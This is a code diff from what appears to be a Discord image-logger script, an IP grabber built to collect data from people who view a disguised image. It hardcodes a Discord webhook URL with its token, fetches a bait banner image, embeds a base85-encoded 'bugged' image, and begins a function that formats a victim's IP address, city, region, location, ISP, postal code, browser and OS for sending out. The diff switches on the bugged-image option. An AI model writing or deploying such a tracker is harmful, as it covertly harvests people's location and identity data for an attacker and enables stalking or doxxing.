@@ -5,7 +5,7 @@ import httpx, base64, httpagentparser
 webhook = 'https://discord.com/api/webhooks/1401001857769537641/o_RhH7w-Sm7CP3TxcWsdkgKfz3328FsAxDGkAScJDkur9DfgS5K-IZLz1h-GL_HFLHUD'
 
 bindata = httpx.get('https://cdn.discordapp.com/banners/1268529189179359293/a_14c3c7167575f9d0fb05d3733cae2587?size=4096').content
-buggedimg = false # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
+buggedimg = true # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
 def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
